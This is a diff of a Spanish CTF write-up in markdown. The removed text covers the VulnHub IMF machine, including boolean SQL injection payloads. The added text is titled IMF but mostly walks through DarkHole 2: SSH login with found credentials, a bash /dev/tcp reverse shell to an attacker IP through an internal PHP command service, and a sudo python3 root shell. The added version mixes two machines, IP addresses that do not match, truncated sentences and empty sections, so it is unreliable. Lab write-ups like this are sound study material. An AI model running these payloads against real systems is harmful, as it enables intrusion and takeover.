@@ -1,160 +1,334 @@
 ---
-title: Plataforma VulnHub IMF
-date: 2025-10-14
-tags: [writeup, vulnhub, web-application-attack, sql-injection, ssh, privilege-escalation]
+title: "VulnHub: IMF: 1"
+date: 2025-10-31
+tags:
+  - writeup
+  - vulnhub
+  - sqli
+  - ssh
+  - privilege-escalation
+  - web-exploitation
+related:
+  - "[[SQLi-Manual]]"
+  - "[[Git-Reconnaissance]]"
+  - "[[Linux-Privesc]]"
+  - "[[SSH-Techniques]]"
 references:
-  - https://www.vulnhub.com/entry/imf-1,162/
+  - https://www.vulnhub.com/entry/darkhole-2,740/
 ---
+# CTF: IMF: 1
 
-!cover.png
+PORTADA
 
-!INFO Informacion General
-
-Este documento contiene un writeup detallado de cómo comprometer la máquina IMF en VulnHub. Se abordan técnicas de enumeración GIT, inyección SQL y escalada de privilegios mediante abuso de servicios locales.
-
+>[!INFO] Información General
+>Este documento contiene un writeup detallado de cómo comprometer la máquina IMF en VulnHub. Se abordan técnicas de
 ---
+## Objetivo
 
-TITLE Plataforma VulnHub IMF
+- Comprometer la máquina virtual [IMF: 1](https://www.vulnhub.com/entry/imf-1,162/).
+- Obtener acceso inicial mediante enumeración web.
+- Escalar privilegios hasta root mediante abuso de servicios vulnerables.
+- Capturar las 5 flags.
+## Herramientas y Comandos Recomendados
 
----
-
-TITLE Objetivo Principal
-
-- Rootear la máquina virtual IMF.
-
----
-
-TITLE Herramientas Utilizadas
-
-| Herramienta | Función principal                      |
-|-------------|--------------------------------------|
-| arp-scan    | Descubrimiento de hosts               |
-| nmap        | Escaneo de puertos y servicios       |
-| tcping      | Verificación de conexiones TCP       |
-| Burp Suite  | Interceptación y modificación HTTP   |
-| VW Ware     | Plataforma de virtualización          |
-
----
-
-!TIP Preparativos Personales
-
-La máquina vulnerable fue ejecutada sobre VMware Workstation en Arch Linux. Las herramientas fueron instaladas desde repositorios oficiales o compiladas con proxy según necesidad.
+| Herramienta | Función principal                             |
+| ----------- | --------------------------------------------- |
+| arp-scan    | Descubre hosts en la red.                     |
+| nmap        | Escaneo y enumeración de puertos y servicios. |
+| wget        | Descarga de archivos desde la web.            |
+| git         | Control de versiones de código.               |
+| Burp Suite  | Análisis y pruebas de tráfico web.            |
+| curl        | Transferencia de datos y pruebas HTTP.        |
+| netcat      | Utilidad multipropósito de red.               |
+| ssh         | Acceso remoto seguro por consola.             |
+| htop        | Monitorización avanzada de procesos.          |
+| netstat     | Revisión de conexiones y puertos activos.     |
+> [!TIP] Preparativos Personales:  
+>Esta máquina vulnerable fue ejecutada bajo un entorno virtualizado usando **VMware Workstation** sobre un sistema operativo **Arch Linux**. Todas las herramientas fueron descargadas e instaladas de los repositorios oficiales o desde la **AUR**. 
 
 ---
+# Informe General:
 
-TITLE Fase de Reconocimiento
+> [!Abstract] Resumen Técnico
+> Se obtuvo acceso inicial 
+## I. Reconocimiento: Fase inicial | arp-scan / tcping
 
-Uso de arp-scan para descubrir IP:
+Lo primero que debes hacer antes de hacer cualquier cosa es reconocer que maquina vas a atacar. Para esto debe reconocer que IP tiene la máquina victima.
 
+Comando utilizado:
+```
 arp-scan -I vmnet1 --localnet
+```
 
-IP descubierta: 172.16.23.129
+Parámetros:
+- `arp-scan`: Herramienta de reconocimiento de red
+- `-I`: Especifica el adaptador de red a escanear
+- `--localnet`: Indica escaneo de toda la red local
 
-Ping sin respuesta, se usó tcping para verificar conectividad, realizó compilación manual desde github.com/cloverstd/tcping.
+![[Pasted image 20251031173658.png]]
+	El escaneo identifica la máquina objetivo en "`172.16.23.129`" dentro de mi red `vmnet1`.
 
-Escaneo básico de puertos con nmap:
+Indentificamos que hay una maquina conectada, por lo que podemos proceder ejecutar el comando ping para verificar conectividad con la máquina:
 
-sudo nmap -p- --open -sS -T4 -vvv -n -Pn 172.16.23.129 -oG allports
+Comando utilizado
+```
+ping 172.16.23.129
+```
+![[Pasted image 20251031174154.png]]
+	No hay conexión por medio de ping.
 
-Puerto abierto: 80
+El comando "ping" usa el protocolo ICMP (Internet Control Message Protocol), que envía paquetes de eco para saber si un dispositivo está accesible en la red. Sin embargo, muchos sistemas o routers pueden bloquear estos paquetes ICMP por seguridad, por lo que "ping" puede fallar aunque el dispositivo esté activo.
 
-Escaneo detallado:
+Ya que no hay conexión mediante conexiones ICMP, probaremos la herramienta [tcping](https://github.com/cloverstd/tcping) para verificar la conexión mediante el protocolo TCP. tcping usa el protocolo TCP  para intentar establecer una conexión directa a un puerto TCP específico en la máquina destino (por ejemplo, puerto 80, 443, etc). Esto permite verificar si un servicio en ese puerto está disponible y funcionando, y no se basa en que ICMP esté permitido o no.
 
-nmap -p80 -sCV 172.16.23.129 -oN targeted
+Una vez copilada ejecutamos:
+```
+./tcping 172.16.23.129
+```
+![[Pasted image 20251031175656.png]]
+	Si podemos confirmar conexión por medio de la herramienta tcping.
 
-Servicio detectado: Apache httpd 2.4.18 Ubuntu
 
----
+### 1.1 Reconocimiento: Escaneo de puerto | nMap
 
-TITLE Enumeración Web y Datos Encontrados
+```
+nmap -p- --open -sS 172.16.23.129 -T4 -n -vvv -Pn -oA nmap 
+```
 
-Se halló cadena en base64 en la página web:
 
-ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
 
-Decodificada da:
 
-flag2{aW1mYWRtaW5pc3RyYXRvcg==}
 
-Texto interno decodificado: imfadministrator
 
-En comentarios de la página se encontró otra flag en base64:
 
-flag1{YWxsdGhlZmlsZXM=}
+| Puerto | Protocolo | Servicio     | Versión                 | Observaciones               |
+| :----: | :-------: | :----------- | :---------------------- | :-------------------------- |
+| 22/tcp |    SSH    | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.3 | Potencial acceso remoto     |
+| 80/tcp |   HTTP    | Apache httpd | 2.4.41 (Ubuntu)         | Aplicación web: DarkHole V2 |
 
-Resultado: allthefiles
 
-Además, se identificaron posibles usuarios visibles en la interfaz.
+### Escaneo de Puertos
 
----
+Comando utilizado:
+```
+nmap -p- --open -sVC -T4 -vvv -n -Pn 172.16.23.128
+```
 
-TITLE Acceso a /imfadministrator
+Parámetros:
+- `nmap`: Herramienta de escaneo de redes.
+- `-p- --open`: Escanea los 65535 puertos y reporta solo los abiertos.
+- `-sVC`: Detecta servicios y ejecuta scripts básicos de reconocimiento
+- `-T4`: Plantilla de velocidad agresiva
+- `-vvv`: Salida verbose en tiempo real, útil para ver información en tiempo real.
+- `-n`: Deshabilita resolución DNS para acelerar el escaneo
+- `-Pn`: Omite host discovery y fuerza el reconocimiento de puertos
 
-Formulario login:
 
-<form method="POST" action="">
-  <label>Username:</label><input type="text" name="user" value=""><br />
-  <label>Password:</label><input type="password" name="pass" value=""><br />
-  <input type="submit" value="Login">
-</form>
+| Puerto | Protocolo | Servicio     | Versión                 | Observaciones               |
+| :----: | :-------: | :----------- | :---------------------- | :-------------------------- |
+| 22/tcp |    SSH    | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.3 | Potencial acceso remoto     |
+| 80/tcp |   HTTP    | Apache httpd | 2.4.41 (Ubuntu)         | Aplicación web: DarkHole V2 |
+En la tabla se puede ve que tal
 
-Comentario indica contraseña "harcoded" (hard-coded).
+#### Puerto
 
----
+#### Puerto 2
 
-TITLE Enumeración y Ataques SQL
-
-Los usuarios existen en la base de datos, se interceptaron peticiones con Burp Suite. Modificación del campo password como array devolvió respuesta TRUE y tercera flag:
-
-flag3{continueTOcms}
-
-En el CMS se probó inyección SQL de tipo booleano con resultado:
-
-GET /imfadministrator/cms.php?pagename=home'  -> error SQL mostrando directorio
-
-Pruebas booleanas para determinar true/false:
-
-GET /imfadministrator/cms.php?pagename=home'+and+'1'='1  -> TRUE (pantalla bienvenida)
-
-GET /imfadministrator/cms.php?pagename=home'+and+'1'='2  -> FALSE (pantalla vacía)
-
----
-
-TITLE Extracción de Información de Base de Datos
-
-Confirmación del nombre de la base: mysql
-
-Ejemplo payload para extracción de datos:
-
-GET /imfadministrator/cms.php?pagename=home'+and+(select+schema_name+from+information_schema.schemata+limit+0,1)='mysql
-
-Enumeración caracter por caracter para bases de datos restantes, por ejemplo:
-
-GET /imfadministrator/cms.php?pagename=home'+and+(select+substring(schema_name,1,1)+from+information_schema.schemata+limit+2,1)='m
-
-Respuesta TRUE.
 
 ---
+## II. Explotación
 
-TITLE Escalada de Privilegios
+### Vulnerabilidad: 
 
-[Por completar con detalles de escalada de privilegios encontrados]
+#### Explotación con
+
+#### Proceso de explotación: SQL
+
+
+> [!success] Credenciales SSH Obtenidas
+> Usuario: jehad  
+> Contraseña: fool
+
+### Obtención de Shell SSH
+
+Comando:
+```
+ssh jehad@172.16.23.128
+```
+![[darkhole_2.18.png]]
+	Acceso exitoso a la máquina como usuario jehad.
 
 ---
+## III. Post-Explotación y Privesc
 
-TITLE Conclusiones
+### Enumeración Interna
 
-[Por completar con resumen y aprendizajes clave]
+**Inventario del sistema:**
+
+Comando para ver kernel:
+```
+uname -a
+```
+![[darkhole_2.34.png]]
+	Resultado: Linux darkhole 5.4.0-81-generic 91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
+
+Comando para ver versión del SO:
+```
+cat /etc/os-release
+```
+![[darkhole_2.33.png]]
+	Resultado: Ubuntu 20.04.3 LTS (Focal Fossa)
+
+Comando para verificar privilegios sudo:
+```
+sudo -l
+```
+![[darkhole_2.32.png]]
+	Resultado: El usuario jehad no tiene permisos sudo.
+
+Comando para ver grupos:
+```
+id
+```
+![[darkhole_2.31.png]]
+	Resultado: jehad no pertenece a grupos privilegiados.
+
+Comando para listar usuarios:
+```
+cat /etc/passwd
+```
+![[darkhole_2.30.png]]
+	Usuarios con bash: root (UID 0), lama (UID 1000), jehad (UID 1001), losy (UID 1002).
+
+Comando para ver historial:
+```
+history
+```
+![[darkhole_2.19.png]]
+	Comandos críticos del historial:
+	1. cd /home/losy
+	2. cd /opt/web
+	3. curl "http://localhost:9999/?cmd=id"
+	4. ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
+
+> [!tip] ¡Servicio Interno Detectado!
+> Gracias a los comandos ejecutados por el usuarios podemos entender que existe un servicio web interno en puerto 9999 con capacidad de ejecución remota de comandos.
+
+Comando para listar puertos en escucha:
+```
+netstat -tulpn
+```
+![[darkhole_2.20.png]]
+	Confirmación: servicio en **LISTEN** bajo puerto 9999.
+
+Comando para ver procesos:
+```
+htop
+```
+![[darkhole_2.21.png]]
+	El servicio corre como usuario losy, servidor PHP ubicado en /opt/web.
+
+Comandos para revisar el script PHP:
+```
+cd /opt/web
+cat index.php
+```
+![[darkhole_2.22.png]]
+	Script PHP simple para ejecución remota de comandos vía parámetro cmd.
+
+### Vector de Escalada
+
+Exploración del directorio home:
+![[darkhole_2.23.png]]
+	Se encontró la flag user.txt en /home/.
+
+#### Explotación del Servicio Interno
+
+Prueba de concepto con curl:
+```
+curl "http://localhost:9999/?cmd=id"
+```
+![[darkhole_2.24.png]]
+	El comando se ejecuta como usuario losy, confirmando RCE.
+
+#### Reverse Shell como losy
+
+Listener en máquina atacante:
+```
+nc -lvnp 443
+```
+![[darkhole_2.25.png]]
+	Nos podemos en escucha para recibir la señal que vamos a enviar desde el servicio PHP.
+
+Para mandar el payload lo debemos hacer en formato "URL Encode". Les dejo un ejemplo de como se vería el comando de forma "normal" y "URL Encoded".
+
+Comando original:
+```
+curl "http://localhost:9999/?cmd=bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
+```
+
+URL Encoded:
+```
+curl "http://localhost:9999/?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'"
+```
+![[darkhole_2.26.png]]
+	Shell inversa obtenida como losy.
+
+> [!WARNING] Advertencia  
+> Una vez establecida la conexión remota mediante netcat, la terminal puede no estar completamente operativa para la interacción directa. Por ello, es recomendable ejecutar un proceso de estabilización antes de continuar con la auditoría, asegurando así un entorno de trabajo más estable y funcional.
+#### Estabilización de TTY
+
+Comandos para estabilizar la shell:
+```
+/usr/bin/script -qc /bin/bash /dev/null
+```
+Luego CTRL+Z y ejecutar:
+```
+stty raw -echo; fg
+```
+Finalmente:
+```
+export TERM=xterm
+```
+
+> [!danger] Información Crítica en Historial
+> Comandos encontrados:
+> 1. sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
+> 2. sudo python3 -c 'import os; os.system("/bin/sh")'
+> 3. P0assw0rd losy:gang (credenciales expuestas)
+> 
+> Esto nos confirma que el usuario losy tiene permisos sudo para ejecutar Python como root bajo la credencial "gang".
+
+### Escalada a Root
+Comando para obtener shell root:
+```
+sudo python3 -c 'import os; os.system("/bin/sh")'
+```
+![[darkhole_2.0.png]]
+	Shell de root obtenida. Flag root.txt capturada en directorio /root.
 
 ---
+## Evidencias
+1. Comando `whoami` y hostname ejecutado como root:
+	![[darkhole_2.35.png]]
 
-!TIP Buenas Prácticas
+Flags capturadas:
+- user.txt: `capturada en /home/`.
+- root.txt: `capturada en /root/`.
 
-[Por completar con recomendaciones]
+> [!tip] Buenas prácticas de evidencia
+> Todos los comandos, payloads y respuestas del servidor fueron documentados con capturas de pantalla para su reproducibilidad.
 
 ---
+## Mitigación y Recomendaciones
 
-!WARNING
 
-Este documento es solo para fines educativos y legales. Se prohíbe su uso para actividades no autorizadas.
 
+---
+## Conclusiones
+
+**Lecciones aprendidas:** La exposición de repositorios Git con historial completo es una vulnerabilidad crítica que puede llevar a la filtración de credenciales. La inyección SQL manual sigue siendo efectiva cuando la validación de entradas es nula. Los servicios internos mal configurados y el historial de bash sin limpiar son vectores de escalada comunes.
+
+### Comparación con entornos reales:
+
+La dificultad media es apropiada. Requiere conocimientos sólidos de enumeración web, SQLi manual y pensamiento lateral para identificar servicios locales.
